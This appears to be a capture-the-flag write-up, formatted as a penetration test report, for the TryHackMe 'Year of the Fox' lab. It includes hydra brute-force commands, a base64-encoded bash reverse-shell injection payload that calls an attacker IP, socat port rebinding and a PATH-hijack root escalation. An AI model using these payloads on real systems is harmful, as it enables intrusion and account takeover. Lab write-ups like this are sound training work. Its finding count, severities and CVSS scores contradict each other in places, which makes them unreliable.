---
title: Formal Report
parent: Year of the Fox
grand_parent: THM Boxes
nav_order: 1
---

# Findings Report

**Target:** Year of the Fox (TryHackMe Boot-to-Root Assessment)

<table>
  <tr>
    <td><strong>Target Host</strong></td>
    <td>10.x.x.x (TryHackMe assigned IP)</td>
  </tr>
  <tr>
    <td><strong>Assessment Type</strong></td>
    <td>Black-box</td>
  </tr>
  <tr>
    <td><strong>Assessor</strong></td>
    <td>Vanik</td>
  </tr>
  <tr>
    <td><strong>Report Date</strong></td>
    <td>12 August 2026</td>
  </tr>
  <tr>
    <td><strong>Overall Risk Rating</strong></td>
    <td>Critical</td>
  </tr>
</table>

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope](#2-scope)
3. [Methodology](#3-methodology)
4. [Detailed Findings](#4-detailed-findings)
   - 4.1 [Local User disclosure via misconfigured Samba share](#41-local-user-disclosure-via-misconfigured-samba-share)
   - 4.2 [Unauthenticated login to password protected web-server via brute forcing](#42-unauthenticated-login-to-password-protected-web-server-via-brute-forcing)
   - 4.3 [Command Injection via Input Validation Flaw](#43-command-injection-via-input-validation-flaw)
   - 4.4 [Port forwarding and IP binding of Local Host SSH Service](#44-port-forwarding-and-ip-binding-of-local-host-ssh-service)
   - 4.5 [Lateral Movement to fox user via ssh brute-forcing](#45-lateral-movement-to-fox-user-via-ssh-brute-forcing)
   - 4.6 [Privilege Escalation to root via PATH hijacking](#46-privilege-escalation-to-root-via-path-hijacking)
5. [Attack Narrative / Kill Chain](#5-attack-narrative--kill-chain)
6. [Summary of Recommendations](#6-summary-of-recommendations)
7. [Conclusion](#7-conclusion)
8. [Appendix: Tools Used](#8-appendix-tools-used)

---

## 1. Executive Summary

This report documents a black-box penetration test performed against the "Year of the Fox" host, a TryHackMe boot-to-root exercise. The objective of the assessment was to identify and exploit vulnerabilities that would allow an unauthenticated attacker to compromise the confidentiality, integrity, and availability of the target environment.

The assessment identified a critical chain of vulnerabilities beginning with a password brute force on teh webserver's http authentication prompt bypassing the weak password of the ```rascal``` user, a command injection flaw on the custom webserver leading to a reverse shell, laterally pivoting from the ```www-data``` user to the ```fox``` user via brute forcing ssh, and escalating to root within the compromised machine via misconfigured Linux ```$PATH``` security.

In total, four findings were identified and are summarized below.

<table>
  <tr>
    <th>#</th>
    <th>Finding</th>
    <th>Severity</th>
    <th>CVSS 3.1</th>
  </tr>
  <tr>
    <td>1</td>
    <td>Local User disclosure via misconfigured Samba share</td>
    <td>🟢 Low</td>
    <td>5.3</td>
  </tr>
  <tr>
    <td>2</td>
    <td>Unauthenticated login to password protected web-server via brute forcing</td>
    <td>🟠 High</td>
    <td>7.5</td>
  </tr>
  <tr>
    <td>3</td>
    <td>Command Injection via Input Validation Flaw</td>
    <td>🟠 High</td>
    <td>7.6</td>
  </tr>
  <tr>
    <td>4</td>
    <td>Port forwarding and IP binding of Local Host SSH Service</td>
    <td>🟢 Low</td>
    <td>3.3</td>
  </tr>
    <td>5</td>
    <td>Lateral Movement to fox user via ssh brute-forcing</td>
    <td>🔴 Critical</td>
    <td>8.0</td>
  </tr>
  <tr>
    <td>6</td>
    <td>Privilege Escalation to root via PATH hijacking</td>
    <td>🔴 Critical</td>
    <td>8.8</td>
  </tr>
</table>

Chained together, these findings resulted in full compromise of the the web-facing machine, from unauthenticated network access to root-level code execution on the host machine.

---

## 2. Scope

<table>
  <tr>
    <td><strong>In-Scope Host</strong></td>
    <td>Web container: TryHackMe assigned IP &nbsp;|&nbsp;</td>
  </tr>
  <tr>
    <td><strong>In-Scope Ports</strong></td>
    <td>22 (local host SSH, discovered), 80 (HTTP), 445 (Samba)</td>
  </tr>
  <tr>
    <td><strong>Testing Type</strong></td>
    <td>Black-box, unauthenticated, external</td>
  </tr>
  <tr>
    <td><strong>Rules of Engagement</strong></td>
    <td>TryHackMe standard lab terms of service</td>
  </tr>
</table>

---

## 3. Methodology

The assessment followed a standard black-box methodology with the following phases:

- Reconnaissance & Service Enumeration (Nmap, smbmap, enum4linux)
- Brute Forcing (hydra)
- Exploitation of Web-Facing Vulnerabilities (command injection vulnerability in webapp exploited via burp-suite)
- Post-Exploitation & Local Privilege Escalation (LinPEAS, Linux $PATH security misconfiguration)

---

## 4. Detailed Findings

### 4.1 Local User disclosure via misconfigured Samba Share

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Low</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</code> (5.3)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td>Machine Samba Share</td>
  </tr>
</table>

**Description**

Initial recon via nmap returned ports running SMB. Using the ```smbmap``` and ```enum4linux``` tools, all local user accounts were enumerated, which led to brute forcing the web authentication prompt on the webserver for the ```rascal``` user.

**Proof of Concept**

smbmap returned all shares on teh machines samba share:

```
<img width="2194" height="888" alt="image" src="https://github.com/user-attachments/assets/a458f6d9-7c1b-4ef6-9f01-9173b7571df3" />

```

```enum4linux``` returned all local users on the machine:

```
<img width="1238" height="190" alt="image" src="https://github.com/user-attachments/assets/f3f5e35a-8567-4d25-beae-b6fa2a21ae08" />

```

**Impact**

This finding allowed a fully remote attacker to enumerate all local users on the machine..

**Remediation**

- Disable 'null' sessions on samba to prevent unauthenticated samba enumeration.
- Segemnt your samba share so only those who require access have access (VLAN, VPN to VLAN for remote users, etc.).

---

### 4.2 Unauthenticated login to password protected web-server via brute forcing

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>High</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code> (7.5)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td><code>HTTP Basic Authentication</code></td>
  </tr>
</table>

**Description**

Following local user enumeration, brute forcing using the accounts ```fox``` and ```rascal``` revealed the password for the ```rascal``` user which gave access to the internal webapp.

**Proof of Concept**

```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt <IP> http-head -m / -vvv -t 30
```

Execution of this one-line command returned a the password for the ```rascal``` user.

**Impact**

An unauthenticated attacker can get a valid password of a valid local user just with enumeration and brute forcing via a one line command, which would grant them access to the password-protected webapp.

**Remediation**

- Implement a strict password policy to prevent attackers from being able to brute force simple passwords
- Implement a form of an IP based ACL to prevent access to the webapp even if an attacker managed to get your password.

---

### 4.3 Command Injection via Input Validation Flaw

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Medium</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L</code> (7.6)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td><code>Custom Rascal's Search System Webapp</code>)</td>
  </tr>
</table>

**Description**

After brute forcing the ```rascal``` user's password and logging into the webapp, the underlying php code that the webapp runs on renders the search input vulnerable to command injection due to a flaw in its input validation.

**Proof of Concept**

Capturing a request to the page via burpsuite, a JSON with a target field is able to be edited to have a reverse shell in its value enabling RCE using quote escaping.

Payload:

```bash
\"; echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMTM1LzkwMDEgMD4mMQ== | base64 -d | bash; #
```

Full Post Request:

<img width="629" height="453" alt="image" src="https://github.com/user-attachments/assets/fba44988-5472-4457-a391-48ea00157679" />


This payload tricked the php web app by closing the quote with a literal quote, then executing the following commands (a base64 encoded reverse shell that is subsequently decoded and then piped over to bash to be executed, and then a php comment symbol to render all code that comes after useless.

**Impact**

This vulnerability in input validation allowed command injection to take place enabling an authenticated attacker to send a reverse shell payload and achieve remote code execution as the ```www-data``` user on the underlying machine as seen in the screenshot below:

<img width="1134" height="468" alt="image" src="https://github.com/user-attachments/assets/9b3529fd-6b57-4a2b-bba5-b7345a679d78" />

**Remediation**

- Avoid using system commands in web app logic when possible.
- Implement strict argument parsing when writing logic for a webapp.
- Implement a Web Application Firewall (WAF) to detect and prevent command injection and other web exploitation techniques.
- - Configure a host-based firewall to block any unnecessary ingress and egress traffic, including binding to external interfaces.
- Implement principles of Least Privilege and Assumed Breach when delegating user privileges for web facing users such as ```www-data```.

---

### 4.4 Port forwarding and IP binding of Local Host SSH Service

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Low</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N</code> (3.3)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td>Local Host SSH Service on port 22</td>
  </tr>
</table>

**Description**

With local user access, a statically compiled ```socat``` binary can be downloaded to the web-facing machine's ```/tmp``` directory and used to bind the local host ssh service to ```0.0.0.0:<PORT>```, which allows the ssh service to be accessible to anyone.

**Proof of Concept**

This simple command using the ```socat``` binary allowed the ssh service to be accessed by anyone on port 2222:

```bash
./socat TCP-LISTEN:2222,fork,bind=<IP> TCP:127.0.0.1:22
```

Upon execution, the SSH service was able to be queried by an unauthenticated, external user.

**Impact**

This finding allows an unauthenticated, external user to query the SSH service meant to be exclusively bound to local host, which allows attackers to perform brute force attacks on the SSH Service (seen in Finding 4.5).

**Remediation**

- Implement the principle of Least Privilege on all web-facing users like ```www-data``` to prevent unneeded command execution and downloads.
- Force the SSH service to bind itself to local host on port 22 so that it cannot be bound to another IP and port.
- Implement network segmentation so that even in the case of unbinding from the local host port, an attacker still cannot make the machine callback to their interface.

---

### 4.5 Lateral Movement to fox user via ssh brute-forcing

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Critical</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L</code> (8.0)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td><code>SSH password for user fox</code></td>
  </tr>
</table>

**Description**

Following the binding of the SSH service to be accessible to anyone via port 2222 (as seen in Finding 4.4), an unauthenticated, external attacker can brute force the SSH password of the ```fox``` user.

**Proof of Concept**

```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://<IP> -vvv -t 30
```

Execution of this one-line command returned a the password for the ```fox``` user.

**Impact**

An unauthenticated attacker can get a valid SSH password of a valid high privilege local user just the enumerated username ```fox``` and brute forcing via a one line command, which would grant them access to an SSH Session as a high privileged user on the machine, enabling privilege escalation to root (seen in Finding 4.6).

**Remediation**

- Implement a strict password policy to prevent attackers from being able to brute force simple passwords.
- Implement a form of an IP based ACL to prevent access to the internal SSH Service, even if an attacker manages to rebind the SSH Service and get your password.

---

### 4.6 Privilege Escalation to root via PATH hijacking

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Critical</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code> (8.8)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td><code>secure_path misconfiguration in sudoers file</code></td>
  </tr>
</table>

**Description**

Following access to the machine via an SSH Session as the user ```fox```, local enumeration returned that there was a program able to be run with root permission, which when decompiled, showed a call to the ```poweroff``` binary. Further local enumeration using the privilege escalation script ```LinPEAS``` returned a vulnerability in the sudoers file which allowed any user to write to the ```$PATH``` environment variable. Combining these two finds, a path hijack is able to be performed in where a malicious binary renamed to the ```poweroff``` binary is used instead of the real ```poweroff``` binary by putting the malicious version in the ```/tmp``` directory, and then exporting ```/tmp``` as the first path to be searched in the ```$PATH``` environment variable.

**Proof of Concept**

```bash
export PATH="/tmp:$PATH"
```

Execution of this one-line command makes the ```/tmp``` directory the first path used to search for binaries called by binaries and the system.

```bash
cp /bin/bash /tmp/poweroff
```

Execution of this command copies the bash program to the ```/tmp``` directory to be executed when it is searched for when an application calls it.

```bash
sudo /usr/sbin/shutdown
```

Execution of this command allows the ```fox``` user to run the binary as root as specified in the sudoers file, but becuase of the absence of the ```secure_path``` configuration in the sudoers file, the call to the ```poweroff``` command made by the ```shutdown``` binary is able to be hijacked via bash named ```/tmp/poweroff``` resulting in a root privileged shell.

**Impact**

This finding allows a remote attacker to have full access and control of the machine, fully compromising the Confidentiality, Integrity, and Availability of the machine.

**Remediation**

- Implement the ```secure_path``` configuration in the sudoers file.
- Implement principle of Least Privilege on all user accounts. (i.e. Only allow root privileges when absolutely needed)
- 
## 5. Attack Narrative / Kill Chain

1. Enumerated open ports via Nmap: 80 (HTTP) and Samba (445).
2. Performed enumeration on the Samba share via ```enum4linux``` and ```smbmap```, which enumerated all local users and shares.
3. Ran hydra against the Basic HTTP Authentication of the web-server hosting the internal webapp, successfully returning the password of the ```rascal``` user.
4. Captured a request to the webapp via burp-suite, allowing for command injection via the JSON parameter due to a flaw in the logic behind the input validation of the webapp, allowing for a reverse shell as user ```www-data```.
5. Used ```socat``` to bind the SSH Service to be accessible to anyone via port 2222.
6. Ran hydra against the SSH service which returned the password of the ```fox``` user, granting an SSH Session as a high privileged user.
7. Discovered that the ```fox``` user was able to run a binary called ```shutdown``` as root, which upon decompilation in Ghidra showed it just made a call to the ```poweroff``` binary.
8. Ran LinPEAS and discovered that the ```$PATH``` variable was writable by users.
9. Hijacked the ```$PATH``` directory to search the ```/tmp``` directory first which hosted bash renamed as ```/tmp/poweroff```, the binary that the ```shutdown``` binary called.
10. ran ```sudo /usr/bin/shutdown``` and was granted a root privileged bash shell.

---

## 6. Summary of Recommendations

The following remediation actions, in priority order, would have prevented or substantially disrupted this attack chain:

- **Enforce network segmentation**: This could have prevented even reaching the webapp.
- **Configure the ```secure_path``` configuration in the sudoers file**: This would have prevented the privilege escalation to root.
- **Disabling Null Session on Samba Shares**: This would have prevented enumeration of local users.
- **Enforce Strict Password Policies**: This would have prevented unauthorized access to the internal webapp and to the SSH service.
- **Proper Input Validation**: This would have prevented the foothold on the machine.

---

## 7. Conclusion

The Year of the Fox host chain was fully compromised from an unauthenticated, external starting position through to root-level code execution on the web-facing machine. The root cause was a combination of weak passwords, improper input validation in the webapp, improper ```$PATH``` environment variable security configurations, an unnecessary null session on the samba share, and improper network segmentation. Addressing any single one of these issues could have independently broken this attack chain before it reached the underlying host.

---

## 8. Appendix: Tools Used

- **Nmap** — service and port enumeration (both external and internal/container-scoped)
- **Hydra** — password brute forcing
- **smbmap and enum4linux** — Samba Share and local user enumeration
- **LinPEAS** — local privilege escalation enumeration
- **netcat** — reverse shell listener
- **socat** — reverse shell listener and binary used for SSH rebinding
